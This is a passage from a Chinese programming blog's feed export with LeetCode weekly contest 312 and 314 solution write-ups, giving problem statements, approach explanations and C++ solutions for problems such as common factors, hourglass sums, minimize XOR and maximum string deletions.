class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l, mid, <span class="built_in">CHL</span>(idx)) + <span class="built_in">queryTree</span>(mid + <span class="number">1</span>, r, <span class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">numberOfPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> diff)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">buildTree</span>(<span class="number">1</span>, <span class="number">0</span>, <span class="number">80000</span>);</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums1[i] - nums2[i] + <span class="number">40000</span>;</span><br><span class="line">            <span class="type">int</span> y = diff;</span><br><span class="line">            ans += <span class="built_in">queryTree</span>(<span class="number">0</span>, x + y, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">updateTree</span>(x, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 312</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/41/</url>
    <content><![CDATA[<h2 id="leetcode-contest-312"><a href="#leetcode-contest-312" class="headerlink" title="leetcode contest 312"></a>leetcode contest 312</h2><p>前三题的题目也确实太水了。</p>
<h4 id="6192-公因子的数目"><a href="#6192-公因子的数目" class="headerlink" title="6192. 公因子的数目"></a>6192. 公因子的数目</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数 <code>a</code> 和 <code>b</code> ，返回 <code>a</code> 和<code> b</code> 的 公 因子的数目。</p>
<p>如果 <code>x</code> 可以同时整除 <code>a</code> 和<code> b</code> ，则认为 <code>x</code> 是 <code>a </code>和 <code>b</code> 的一个 公因子 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：a = 12, b = 6</span><br><span class="line">输出：4</span><br><span class="line">解释：12 和 6 的公因子是 1、2、3、6 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：a = 25, b = 30</span><br><span class="line">输出：2</span><br><span class="line">解释：25 和 30 的公因子是 1、5 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= a, b &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-common-factors/">https://leetcode.cn/problems/number-of-common-factors/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>因为数据量实在太小，直接暴力即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 给定的数的大小。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">commonFactors</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">min</span>(a, b);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= x; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((a % i == <span class="number">0</span>) &amp;&amp; (b % i == <span class="number">0</span>)) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6193-沙漏的最大总和"><a href="#6193-沙漏的最大总和" class="headerlink" title="6193. 沙漏的最大总和"></a>6193. 沙漏的最大总和</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个大小为 <code>m x n</code> 的整数矩阵 <code>grid</code>。<br>按以下形式将矩阵的一部分定义为一个 沙漏 ：<br>返回沙漏中元素的 最大 总和。<br>注意：沙漏无法旋转且必须整个包含在矩阵中。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[6,2,1,3],[4,2,1,5],[9,2,8,7],[4,1,2,9]]</span><br><span class="line">输出：30</span><br><span class="line">解释：上图中的单元格表示元素总和最大的沙漏：6 + 2 + 1 + 2 + 9 + 2 + 8 = 30 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,2,3],[4,5,6],[7,8,9]]</span><br><span class="line">输出：35</span><br><span class="line">解释：上图中的单元格表示元素总和最大的沙漏：1 + 2 + 3 + 5 + 7 + 8 + 9 = 35 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>3 &lt;= m, n &lt;= 150</code></li>
<li><code>0 &lt;= grid[i][j] &lt;= 106</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-sum-of-an-hourglass/">https://leetcode.cn/problems/maximum-sum-of-an-hourglass/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>枚举中心
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设矩阵的行列分别为 $m,n$，根据题意我们枚举所有可能的中心位置 $x$，可以知道以 $(x,y)$ 为中心的位置的沙漏元素和为 $grid[x][y] + \sum_{i &#x3D; y - 1}^{y+1} \limits (grid[x-1][i] + grid[x+1][i])$，我们依次求出可能的沙漏值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m \times n)$，其中 $m,n$ 表示矩阵的行与列。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="type">int</span> tot = grid[i][j];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = j - <span class="number">1</span>; k &lt;= j + <span class="number">1</span>; k++) &#123;</span><br><span class="line">                    tot += grid[i<span class="number">-1</span>][k];</span><br><span class="line">                    tot += grid[i+<span class="number">1</span>][k];</span><br><span class="line">                &#125;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, tot);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6194-最小-XOR"><a href="#6194-最小-XOR" class="headerlink" title="6194. 最小 XOR"></a>6194. 最小 XOR</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数 <code>num1</code> 和 <code>num2</code> ，找出满足下述条件的整数 <code>x</code> ：</p>
<ul>
<li><code>x</code> 的置位数和 <code>num2</code> 相同，且</li>
<li><code>x XOR num1</code> 的值 最小<br>注意 <code>XOR</code> 是按位异或运算。</li>
</ul>
<p>返回整数 <code>x</code> 。题目保证，对于生成的测试用例， <code>x</code> 是 唯一确定 的。</p>
<p>整数的 置位数 是其二进制表示中 <code>1</code> 的数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num1 = 3, num2 = 5</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">num1 和 num2 的二进制表示分别是 0011 和 0101 。</span><br><span class="line">整数 3 的置位数与 num2 相同，且 3 XOR 3 = 0 是最小的。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num1 = 1, num2 = 12</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">num1 和 num2 的二进制表示分别是 0001 和 1100 。</span><br><span class="line">整数 3 的置位数与 num2 相同，且 3 XOR 1 = 2 是最小的。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= num1, num2 &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimize-xor/">https://leetcode.cn/problems/minimize-xor/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的贪心熟路，设 $n$ 表示 $nums2$ 的位数，$m$ 表示 $nums1$ 的二进制中的 $1$ 最高位数，则有以下两种情况:</li>
</ol>
<ul>
<li>$m \le n$: 此时我们只能选择在最低的 $n$ 位全部填充为 $1$ 即可，此时返回结果为 $2^n - 1$；</li>
<li>$m &gt; n$: 此时我们只能选择在低 $m$ 位选择 $n$ 位填充为 $1$ 即可：<ul>
<li>首先按照异或的规则，我们应当先在 $nums1$ 中从高到低的位数中为 $1$ 的位中填写 $1$，这样就可以优先将 $nums1$ 中高位的 $1$ 消为 $0$；</li>
<li>如果将 $nums1$ 中的 $1$ 全部消掉，如果 $n$ 仍然还大于 $0$，此时我们应当贪心的在 $nums1$ 中从低往高的位数中为 $0$ 位中填写 $1$，这样保证形成的数最小；</li>
</ul>
</li>
</ul>
<ol start="2">
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(\log (nums1) + \log (nums2))$，$nums1,nums2$ 为给定的数。</li>
<li>空间复杂度：时间复杂度为 $O(\log (nums1))$，$nums1,nums2$ 为给定的数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimizeXor</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = __builtin_popcount(num2);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">while</span>(num1 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(num1 % <span class="number">2</span>);</span><br><span class="line">            num1 /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n &gt;= m) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>;  n &gt; <span class="number">0</span> &amp;&amp; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                    res += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">                    n--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; n &gt; <span class="number">0</span> &amp;&amp; i &lt; m; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                    res += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">                    n--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6195-对字母串可执行的最大删除数"><a href="#6195-对字母串可执行的最大删除数" class="headerlink" title="6195. 对字母串可执行的最大删除数"></a>6195. 对字母串可执行的最大删除数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个仅由小写英文字母组成的字符串 <code>s</code> 。在一步操作中，你可以：</p>
<p>删除 整个字符串 <code>s</code> ，或者<br>对于满足 <code>1 &lt;= i &lt;= s.length / 2 </code>的任意<code>i</code>，如果 <code>s</code> 中的 前 <code>i</code> 个字母和接下来的 <code>i</code> 个字母 相等 ，删除 前 <code>i</code> 个字母。<br>例如，如果 <code>s = &quot;ababc&quot;</code> ，那么在一步操作中，你可以删除 <code>s</code> 的前两个字母得到 <code>&quot;abc&quot;</code> ，因为 <code>s</code> 的前两个字母和接下来的两个字母都等于 <code>&quot;ab&quot;</code> 。</p>
<p>返回删除 <code>s</code> 所需的最大操作数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcabcdabc&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">- 删除前 3 个字母（&quot;abc&quot;），因为它们和接下来 3 个字母相等。现在，s = &quot;abcdabc&quot;。</span><br><span class="line">- 删除全部字母。</span><br><span class="line">一共用了 2 步操作，所以返回 2 。可以证明 2 是所需的最大操作数。</span><br><span class="line">注意，在第二步操作中无法再次删除 &quot;abc&quot; ，因为 &quot;abc&quot; 的下一次出现并不是位于接下来的 3 个字母。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aaabaab&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">- 删除第一个字母（&quot;a&quot;），因为它和接下来的字母相等。现在，s = &quot;aabaab&quot;。</span><br><span class="line">- 删除前 3 个字母（&quot;aab&quot;），因为它们和接下来 3 个字母相等。现在，s = &quot;aab&quot;。 </span><br><span class="line">- 删除第一个字母（&quot;a&quot;），因为它和接下来的字母相等。现在，s = &quot;ab&quot;。</span><br><span class="line">- 删除全部字母。</span><br><span class="line">一共用了 4 步操作，所以返回 4 。可以证明 4 是所需的最大操作数。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aaaaa&quot;</span><br><span class="line">输出：5</span><br><span class="line">解释：在每一步操作中，都可以仅删除 s 的第一个字母。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 4000</code></li>
<li><code>s</code> 仅由小写英文字母组成</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-deletions-on-a-string/description/">https://leetcode.cn/problems/maximum-deletions-on-a-string/description/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先我们需要求的是对于两个字符串的匹配相等问题，我们可以用动态规划或者 <code>krap</code>算法均可，来计算两个相同长度的字符串的匹配相等问题，设 $lcp[i][j]$ 表示 $i,j$ 开始可以匹配的最长长度。</li>
</ol>
<ul>
<li>动态规划的递推公式为 $$lcp[i][j] &#x3D; lcp[i+1][j+1], \quad if s[i] &#x3D; s[j]$$<br>上述的过程我们可以进行预处理，比较简单。</li>
</ul>
<ol start="2">
<li>我们设 $dp[i]$ 表示 $s$ 从 $i$ 处开始消除所需要的最大操作步数，我们从后往前遍历，假设 $s[i,\cdots, i + k - 1] &#x3D; s[i + k,\cdots, i + 2k - 1]$，此时我们知道可以从 $k$ 处断开消减前 $k$ 个字符，所以可以得到递推公式如下:<br>$$<br>dp[i] &#x3D; \max(dp[i], dp[i + k] + 1)<br>$$</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示字符串的长度。</li>
<li>空间复杂度：$O(n^2)$，其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ol>
<li>解法 $1$:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">deleteString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> base = <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">same</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n + <span class="number">1</span>, <span class="literal">false</span>));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">arr</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[i + <span class="number">1</span>] = (arr[i] * base) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> h = <span class="number">0</span>;</span><br><span class="line">            vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; cnt;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">                h = (h * base % mod + (s[j] - <span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">                cnt.<span class="built_in">emplace_back</span>(h);</span><br><span class="line">                <span class="keyword">if</span> ((j - i + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> k = (j - i + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> h1 = cnt[k - <span class="number">1</span>] * arr[k] % mod;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> h2 = (cnt.<span class="built_in">back</span>() - cnt[k - <span class="number">1</span>] * arr[k] % mod + mod) * arr[k] % mod;</span><br><span class="line">                    <span class="keyword">if</span> (h1 == h2) &#123;</span><br><span class="line">                        same[i + <span class="number">1</span>][k] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[i - <span class="number">1</span>] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; i + j * <span class="number">2</span> - <span class="number">1</span> &lt;= n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (same[i][j]) &#123;</span><br><span class="line">                        dp[i + j - <span class="number">1</span>] = <span class="built_in">max</span>(dp[i + j - <span class="number">1</span>], dp[i - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                    &#125; </span><br><span class="line">                &#125;</span><br><span class="line">                dp[n] = <span class="built_in">max</span>(dp[n], dp[i - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>解法 $2$:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">deleteString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">lcp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">                    lcp[i][j] = lcp[i + <span class="number">1</span>][j + <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[n] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= (n - i) / <span class="number">2</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lcp[i][i + j] &gt;= j) &#123;</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i], dp[i + j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 314</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/42/</url>
    <content><![CDATA[<h2 id="leetcode-contest-314"><a href="#leetcode-contest-314" class="headerlink" title="leetcode contest 314"></a>leetcode contest 314</h2><p>第三题竟然时最难的题目了，第四题确实太简单了一点。</p>
<h4 id="6200-处理用时最长的那个任务的员工"><a href="#6200-处理用时最长的那个任务的员工" class="headerlink" title="6200. 处理用时最长的那个任务的员工"></a>6200. 处理用时最长的那个任务的员工</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>共有 <code>n</code> 位员工，每位员工都有一个从 <code>0</code> 到 <code>n - 1</code> 的唯一 <code>id</code> 。</p>
<p>给你一个二维整数数组 <code>logs</code> ，其中 <code>logs[i] = [idi, leaveTimei]</code> ：</p>
<ul>
<li><code>idi</code> 是处理第 <code>i</code> 个任务的员工的 <code>id</code> ，且</li>
<li><code>leaveTimei</code> 是员工完成第 <code>i</code> 个任务的时刻。所有 <code>leaveTimei</code> 的值都是 唯一 的。<br>注意，第 <code>i</code> 个任务在第<code>(i - 1)</code>个任务结束后立即开始，且第<code> 0</code> 个任务从时刻 <code>0</code> 开始。</li>
</ul>
<p>返回处理用时最长的那个任务的员工的 <code>id</code> 。如果存在两个或多个员工同时满足，则返回几人中 最小 的 <code>id</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 10, logs = [[0,3],[2,5],[0,9],[1,15]]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">任务 0 于时刻 0 开始，且在时刻 3 结束，共计 3 个单位时间。</span><br><span class="line">任务 1 于时刻 3 开始，且在时刻 5 结束，共计 2 个单位时间。</span><br><span class="line">任务 2 于时刻 5 开始，且在时刻 9 结束，共计 4 个单位时间。</span><br><span class="line">任务 3 于时刻 9 开始，且在时刻 15 结束，共计 6 个单位时间。</span><br><span class="line">时间最长的任务是任务 3 ，而 id 为 1 的员工是处理此任务的员工，所以返回 1 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 26, logs = [[1,1],[3,7],[2,12],[7,17]]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">任务 0 于时刻 0 开始，且在时刻 1 结束，共计 1 个单位时间。</span><br><span class="line">任务 1 于时刻 1 开始，且在时刻 7 结束，共计 6 个单位时间。</span><br><span class="line">任务 2 于时刻 7 开始，且在时刻 12 结束，共计 5 个单位时间。</span><br><span class="line">任务 3 于时刻 12 开始，且在时刻 17 结束，共计 5 个单位时间。</span><br><span class="line">时间最长的任务是任务 1 ，而 id 为 3 的员工是处理此任务的员工，所以返回 3 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, logs = [[0,10],[1,20]]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">任务 0 于时刻 0 开始，且在时刻 10 结束，共计 10 个单位时间。</span><br><span class="line">任务 1 于时刻 10 开始，且在时刻 20 结束，共计 10 个单位时间。</span><br><span class="line">时间最长的任务是任务 0 和 1 ，处理这两个任务的员工的 id 分别是 0 和 1 ，所以返回最小的 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= n &lt;= 500</code></li>
<li><code>1 &lt;= logs.length &lt;= 500</code></li>
<li><code>logs[i].length == 2</code></li>
<li><code>0 &lt;= idi &lt;= n - 1</code></li>
<li><code>1 &lt;= leaveTimei &lt;= 500</code></li>
<li><code>idi != idi + 1</code></li>
<li><code>leaveTimei</code> 按严格递增顺序排列</li>
</ul>
